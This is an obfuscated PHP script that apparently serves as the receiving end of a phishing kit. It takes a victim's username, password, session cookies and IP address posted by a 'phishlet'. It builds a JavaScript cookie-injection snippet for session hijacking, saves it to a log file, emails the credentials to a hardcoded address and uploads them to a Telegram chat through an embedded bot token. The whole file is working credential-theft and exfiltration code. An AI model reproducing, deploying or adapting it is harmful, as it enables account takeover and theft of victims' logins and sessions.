<?php
 goto SMin0; xrGWO: $res = json_decode($responseBody, true); goto TiHUL; SMin0: ini_set("\x64\x69\163\x70\x6c\141\171\x5f\x73\x74\141\162\164\165\160\x5f\145\x72\162\157\162\x73", 1); goto mTF90; fpp7f: $Send_Log = 1; goto pzQkf; B7Unq: function frgZx($url) { goto Zad1q; rKkwW: curl_setopt($ch, CURLOPT_HEADER, 0); goto fpK8W; X19Ip: return $data; goto aMzOG; Zv9aX: curl_setopt($ch, CURLOPT_AUTOREFERER, false); goto rKkwW; fpK8W: curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); goto No9mY; xec90: curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true); goto tlQhP; tlQhP: $data = curl_exec($ch); goto h08gR; h08gR: curl_close($ch); goto X19Ip; No9mY: curl_setopt($ch, CURLOPT_URL, $url); goto xec90; Zad1q: $ch = curl_init(); goto Zv9aX; aMzOG: } goto B7yfd; idICh: header("\x41\x63\x63\x65\x73\163\55\103\157\x6e\164\x72\x6f\154\x2d\101\154\154\x6f\x77\55\x48\145\x61\144\x65\x72\163\x3a\x20\170\x2d\164\x65\x73\x74\x2d\150\145\x61\x64\145\x72\54\40\x4f\x72\151\147\151\156\x2c\40\130\55\x52\145\x71\165\145\x73\x74\145\x64\x2d\x57\x69\164\150\54\40\103\x6f\x6e\164\x65\156\x74\x2d\x54\171\x70\145\54\x20\x41\x63\x63\145\160\164"); goto KFlDL; Af1dF: header("\101\x63\143\x65\163\163\x2d\103\x6f\x6e\x74\x72\157\x6c\55\x41\x6c\x6c\157\x77\x2d\x4f\162\x69\x67\x69\156\72\x20\x2a"); goto cuNWR; nps1V: $bot_token = "\65\63\x39\71\x31\x30\x30\x37\x31\60\72\x41\x41\x46\151\x44\106\x2d\166\115\x4c\165\66\x32\103\x39\x76\116\x4d\144\171\x43\161\x35\171\x51\125\x4c\141\x6c\x62\x58\55\152\122\x45"; goto CU2xR; cuNWR: header("\101\143\x63\145\163\x73\x2d\x43\x6f\x6e\x74\162\x6f\154\55\101\154\x6c\x6f\x77\55\x4d\145\x74\150\x6f\x64\x73\72\x20\107\x45\124\54\x20\x50\x4f\x53\124\x2c\40\x50\x55\x54\54\x20\x44\x45\x4c\x45\x54\x45\x2c\40\117\x50\124\x49\117\116\123"); goto idICh; KFlDL: $send = "\154\157\x66\x74\x75\163\x2e\x63\x68\x65\145\x6b\x73\100\160\x72\157\164\157\156\x6d\141\x69\x6c\56\143\157\x6d"; goto fpp7f; PjGZW: $Tele_bot = 1; goto nps1V; pzQkf: $Save_Log = 1; goto PjGZW; eEUJl: error_reporting(-1); goto Af1dF; mTF90: ini_set("\x64\x69\x73\160\154\x61\x79\137\145\x72\162\157\162\x73", 1); goto eEUJl; CU2xR: $chat_id = "\x2d\x31\x30\x30\62\x34\67\x36\61\66\66\x38\65\x35"; goto B7Unq; rgjSB: $responseBody = file_get_contents("\160\x68\x70\x3a\57\57\151\156\160\165\x74"); goto xrGWO; B7yfd: function nVqj2($chat_id, $bot_token, $output, $filetype, $name) { goto YMGSt; OM1fS: $curl = curl_init(); goto KI2UY; G9Rwi: curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); goto uC7SZ; OfB6A: curl_setopt($curl, CURLOPT_POST, true); goto LOxYT; YMGSt: $tempFilePath = tempnam(sys_get_temp_dir(), "\157\x75\x74\160\165\164\137"); goto c_IDH; c_IDH: file_put_contents($tempFilePath, $output); goto v7d02; KI2UY: curl_setopt($curl, CURLOPT_HEADER, false); goto G9Rwi; KRBHA: curl_close($curl); goto kPmfY; uC7SZ: curl_setopt($curl, CURLOPT_URL, "\x68\164\x74\160\x73\x3a\x2f\57\x61\160\x69\56\164\x65\x6c\145\x67\162\141\155\x2e\157\x72\147\57\142\157\x74" . $bot_token . "\57\x73\x65\x6e\x64\104\157\143\x75\x6d\x65\x6e\164"); goto OfB6A; kPmfY: unlink($tempFilePath); goto i3kls; v7d02: $content = array("\143\x68\141\164\137\151\x64" => $chat_id, "\144\x6f\143\x75\155\x65\156\164" => new CURLFile(realpath($tempFilePath), $filetype, $name)); goto OM1fS; bfRwd: $json_response = curl_exec($curl); goto KRBHA; i3kls: return json_decode($json_response, true); goto MRUpC; LOxYT: curl_setopt($curl, CURLOPT_POSTFIELDS, $content); goto bfRwd; MRUpC: } goto rgjSB; TiHUL: if ($res) { goto Gp7RP; zdVmc: $headers .= "\x4d\x49\115\105\x2d\126\x65\x72\x73\151\157\156\x3a\40\61\x2e\60\15\12"; goto j3X9Y; tqzXM: $cookie_encoded = base64_encode($final); goto kcRmP; wz54s: $subject = "{$phishlet}\40\174\x20{$ip}"; goto zdVmc; c_DLz: $username = $res["\x75\x73\145\x72\x6e\x61\155\145"]; goto Inhek; SxjMG: foreach ($res["\164\x6f\x6b\145\156\x73"] as $name => $value) { goto DGfX4; qAckD: eEk5_: goto gEpQY; gEpQY: Mxsge: goto uphMw; DGfX4: foreach ($value as $name2 => $value2) { goto V_H93; AFNLb: $tokens[] = $topush; goto XrBgm; XrBgm: F9n_i: goto AX7lz; V_H93: $topush = ["\x6e\141\x6d\145" => "{$name2}", "\x70\141\x74\x68" => "{$value2["\x50\141\164\150"]}", "\x76\141\154\165\145" => "{$value2["\x56\x61\x6c\165\x65"]}", "\x64\x6f\155\141\x69\x6e" => "{$name}", "\163\145\143\165\x72\x65" => "{$value2["\x48\164\164\x70\x4f\x6e\154\171"]}"]; goto AFNLb; AX7lz: } goto qAckD; uphMw: } goto FdMX2; kcRmP: $mg = "\123\x49\104\x3a\x20{$id}\40{$username}\72{$password}\xa\12"; goto PMtAv; WLilQ: W3fPX: goto uxi1C; NVgtt: $ip = $res["\x72\x65\155\157\x74\x65\137\141\x64\x64\x72"]; goto jSSIh; KtPpJ: $log = [$username => $password]; goto Kjgcn; uCztb: $final = json_encode($cookie, true); goto NVgtt; PMtAv: $mg .= "\103\x6f\157\x6b\x69\x65\x3a\40{$cookie_encoded}\12\12"; goto wz54s; Gp7RP: $id = $res["\151\x64"]; goto XQxZf; pw8V0: $cookie = array_merge($finalArray, $finalArray2); goto uCztb; jSSIh: $res = json_decode($final, true); goto w4FZH; FdMX2: LQbDs: goto KtPpJ; Kjgcn: $finalArray = ["\164\x6f\153\x65\x6e\x73" => $tokens]; goto WZ95L; XQxZf: $phishlet = $res["\160\150\x69\x73\150\x6c\145\x74"]; goto c_DLz; w4FZH: $mg2 = "\50\141\163\171\156\x63\40\x28\x29\x20\75\x3e\x20\173\xd\12\x20\x20\x20\40\x6c\x65\164\x20\143\x6f\157\x6b\151\x65\x73\40\75\x20\x5b"; goto XF0gG; j3X9Y: $headers .= "\103\157\x6e\164\145\x6e\164\55\x54\x79\x70\x65\x3a\x20\164\145\x78\164\57\160\154\x61\151\x6e\x3b\x20\x63\150\x61\162\163\145\164\75\x75\x74\146\x2d\x38\xd\12"; goto yzhDR; noRlY: $tokens = []; goto SxjMG; Inhek: $password = $res["\x70\141\163\163\167\x6f\162\x64"]; goto noRlY; uxi1C: $mg2 .= "\x5d\xd\12\x20\40\40\40\166\x61\162\40\x72\145\144\x20\x3d\x20\42\143\157\154\x6f\162\x3a\162\145\x64\73\40\146\x6f\x6e\x74\55\163\x69\172\x65\x3a\66\65\160\170\73\x20\x66\157\x6e\164\x2d\x77\145\x69\x67\150\164\x3a\x62\x6f\154\x64\73\x20\55\167\x65\x62\x6b\x69\x74\55\x74\145\x78\x74\55\163\164\x72\157\x6b\x65\72\x20\x31\x70\x78\40\142\154\x61\143\153\42\73\xd\xa\x20\40\x20\40\146\165\156\x63\x74\151\x6f\x6e\x20\163\x65\x74\x43\x6f\x6f\153\151\145\50\153\145\x79\x2c\40\x76\x61\154\x75\x65\54\x20\144\x6f\155\141\151\156\54\x20\x70\141\164\x68\54\40\151\163\123\x65\143\x75\x72\145\x2c\40\163\141\x6d\145\123\x69\x74\145\x29\40\173\15\12\x20\x20\x20\40\x20\40\x20\40\x63\157\156\163\164\40\143\x6f\x6f\153\151\x65\x4d\x61\x78\x41\147\145\40\x3d\x20\47\x4d\x61\170\x2d\x41\x67\x65\x3d\x33\x31\x35\63\x36\60\60\60\x27\x20\x2f\x2f\x20\x73\145\x74\x20\143\157\x6f\153\x69\145\x73\40\164\x6f\x20\x6f\156\x65\40\171\x65\x61\x72\xd\xa\40\x20\x20\x20\40\x20\x20\x20\40\151\x66\40\x28\x21\41\x73\x61\x6d\x65\123\x69\x74\x65\51\x20\x7b\xd\xa\40\x20\40\x20\40\40\x20\40\40\x20\x20\x63\x6f\157\x6b\151\145\123\141\155\145\x53\151\x74\145\40\x3d\x20\x73\x61\x6d\145\123\151\164\145\x3b\xd\12\x20\40\x20\40\x20\40\40\40\175\x20\x65\154\163\x65\40\x7b\15\12\x20\x20\x20\40\40\40\x20\40\x20\40\x20\x63\157\157\x6b\151\145\x53\x61\x6d\x65\123\x69\164\145\40\75\40\47\x4e\x6f\156\x65\47\73\xd\xa\40\40\x20\x20\40\40\40\x20\175\xd\xa\x20\x20\40\40\x20\40\x20\x20\151\x66\x20\x28\x69\x73\x53\x65\x63\x75\162\x65\51\40\173\15\xa\40\40\x20\x20\x20\x20\x20\40\x20\40\40\x20\40\40\40\40\x69\x66\40\x28\x77\151\156\x64\157\x77\x2e\154\157\x63\x61\164\151\157\x6e\x2e\150\157\163\x74\156\141\x6d\x65\x20\x3d\x3d\40\144\157\x6d\x61\151\156\51\x20\x7b\15\xa\x20\40\40\x20\40\40\40\40\x20\40\x20\x20\x20\40\x20\40\40\x20\40\40\144\157\x63\x75\155\x65\x6e\x74\x2e\143\x6f\157\153\x69\145\40\x3d\40\x60\x24\173\x6b\x65\x79\x7d\75\44\x7b\166\x61\x6c\165\145\x7d\73\44\x7b\143\157\157\x6b\x69\x65\115\141\x78\x41\147\145\175\73\x20\x70\141\x74\x68\x3d\x24\173\x70\141\x74\x68\x7d\x3b\x20\123\x65\143\165\162\x65\73\40\123\141\x6d\145\123\151\x74\x65\x3d\x24\173\x63\x6f\x6f\153\x69\145\123\x61\155\145\x53\x69\164\x65\175\140\73\xd\xa\x20\x20\40\x20\x20\x20\40\40\x20\40\40\40\40\x7d\40\145\x6c\163\145\40\173\xd\xa\40\x20\40\x20\x20\x20\40\x20\x20\40\40\x20\x20\x20\40\x20\x20\40\x20\40\144\157\143\x75\155\x65\x6e\164\x2e\143\x6f\x6f\153\x69\x65\x20\75\x20\140\x24\173\153\145\171\x7d\75\x24\x7b\166\141\154\x75\x65\175\73\x24\x7b\143\x6f\x6f\x6b\151\x65\x4d\x61\170\101\x67\145\x7d\x3b\144\x6f\x6d\x61\x69\x6e\x3d\x24\x7b\144\157\155\x61\151\x6e\x7d\x3b\160\x61\x74\x68\75\44\173\x70\x61\164\150\x7d\73\x53\145\143\165\162\x65\x3b\x53\x61\x6d\145\x53\x69\164\145\75\x24\173\x63\x6f\157\x6b\151\x65\x53\141\155\x65\x53\x69\164\x65\x7d\140\73\15\xa\x20\40\40\40\x20\40\40\40\x20\40\x20\40\x7d\15\12\40\x20\x20\x20\40\40\40\40\40\x20\x20\x20\175\x20\x65\x6c\x73\x65\x20\173\xd\xa\40\x20\40\40\40\40\40\x20\40\x20\40\x20\40\40\40\40\151\x66\x20\x28\167\x69\x6e\x64\x6f\167\x2e\154\x6f\143\x61\164\x69\x6f\156\56\x68\157\163\164\x6e\141\155\145\40\75\75\40\x64\157\x6d\141\x69\x6e\x29\40\173\xd\xa\x20\x20\40\40\40\40\x20\40\40\x20\x20\40\x20\x20\x20\x20\40\x20\40\x20\x64\x6f\143\165\x6d\145\156\x74\x2e\143\x6f\x6f\153\x69\145\x20\x3d\x20\140\44\x7b\153\145\x79\175\x3d\44\x7b\166\141\x6c\x75\x65\x7d\x3b\x24\173\143\x6f\157\153\151\145\x4d\x61\170\x41\x67\145\x7d\73\160\141\x74\150\75\44\x7b\x70\x61\164\x68\175\73\140\73\xd\xa\40\40\x20\40\x20\40\40\x20\40\40\x20\40\40\40\40\x20\x7d\x20\x65\x6c\x73\x65\x20\173\xd\12\40\x20\x20\x20\x20\40\40\40\40\x20\x20\40\40\x20\40\x20\x20\x20\x20\x20\x64\157\x63\x75\x6d\x65\x6e\x74\x2e\x63\x6f\157\x6b\151\x65\40\75\x20\140\x24\173\153\145\171\x7d\75\x24\173\166\x61\x6c\x75\145\175\73\x24\x7b\x63\157\x6f\x6b\151\x65\115\141\x78\x41\x67\x65\175\73\x64\x6f\x6d\x61\x69\x6e\75\x24\173\144\x6f\155\x61\151\x6e\175\73\160\141\x74\x68\75\44\x7b\x70\x61\164\x68\175\73\140\73\xd\xa\40\40\40\40\x20\40\x20\40\x20\40\x20\40\x20\x20\x20\x20\175\xd\12\40\x20\40\40\40\x20\x20\40\40\x20\x20\x20\x7d\xd\12\40\40\x20\x20\175\xd\xa\x20\40\x20\x20\x66\x6f\x72\40\x28\x6c\x65\x74\x20\143\157\157\153\151\x65\40\157\146\x20\143\157\x6f\153\x69\145\x73\51\40\173\15\xa\40\x20\x20\x20\x20\40\x20\40\163\x65\164\x43\x6f\157\x6b\151\x65\x28\x63\157\157\x6b\151\145\x2e\156\x61\x6d\x65\x2c\x20\x63\x6f\157\x6b\x69\x65\x2e\166\x61\154\x75\x65\54\40\143\157\157\153\x69\145\56\144\x6f\x6d\x61\151\x6e\54\x20\143\x6f\x6f\153\151\145\x2e\160\x61\164\150\x2c\x20\x63\x6f\x6f\153\x69\x65\x2e\x73\x65\x63\165\162\x65\51\15\xa\x20\x20\x20\x20\175\xd\xa\40\40\x20\40\x63\x6f\x6e\x73\157\154\145\56\x6c\x6f\147\x28\47\45\143\x43\117\117\x4b\x49\x45\40\111\116\112\105\103\124\x45\104\x27\54\x20\x72\145\144\51\x3b\xd\12\11\x6c\157\143\141\164\x69\157\x6e\56\x72\x65\154\157\141\144\x28\x29\73\xd\12\175\x29\x28\51\x3b"; goto tqzXM; WZ95L: $finalArray2 = ["\x6c\x6f\147" => $log]; goto pw8V0; XF0gG: foreach ($res["\164\157\x6b\145\156\163"] as $key) { goto DoqOe; DoqOe: if ($key["\163\x65\143\165\x72\x65"] == 1) { $httponly = "\x74\162\x75\145"; } else { $httponly = "\x6e\165\x6c\x6c"; } goto PrAuu; ZvWgZ: P7BQy: goto gp5uU; PrAuu: $mg2 .= "\x7b\15\xa\x20\x20\40\x20\42\x6e\x61\x6d\x65\x22\x3a\40\x22" . $key["\156\x61\155\x65"] . "\x22\54\15\xa\x20\x20\x20\40\42\160\x61\164\150\42\72\x20\42" . $key["\160\141\x74\150"] . "\42\54\15\12\x20\40\40\x20\42\x76\141\x6c\165\145\x22\x3a\x20\x22" . $key["\166\x61\x6c\x75\x65"] . "\42\54\xd\xa\x20\40\40\x20\42\x64\157\155\141\151\156\x22\72\40\42" . $key["\144\x6f\x6d\141\151\156"] . "\x22\54\15\12\x20\x20\x20\x20\x22\x73\x65\x63\x75\162\x65\42\72\x20\x74\x72\165\145\x2c\15\xa\x20\40\x20\40\x22\150\164\x74\160\x6f\x6e\154\171\x22\x3a\x20" . $httponly . "\xd\xa\x20\x20\175\54"; goto ZvWgZ; gp5uU: } goto WLilQ; yzhDR: if ($username != '' && $password != '') { goto oQKdu; tkdPQ: if ($Send_Log == 1) { mail($send, $subject, $mg, $headers); } goto RMCIn; oQKdu: if ($Save_Log == 1) { goto BPzkx; BPzkx: $file = fopen("\x72\x65\x7a\x2f{$username}\x2e\164\x78\164", "\141"); goto OCWeI; OCWeI: fwrite($file, $mg2); goto jwFfL; jwFfL: fclose($file); goto XGfoP; XGfoP: } goto tkdPQ; RMCIn: if ($Tele_bot == 1) { $result = $mg; $response = NVqj2($chat_id, $bot_token, $result, "\x74\x65\170\x74\x2f\x70\x6c\x61\151\x6e", $username . "\x2e\164\170\x74"); } goto C5Df4; C5Df4: } goto FIULB; FIULB: }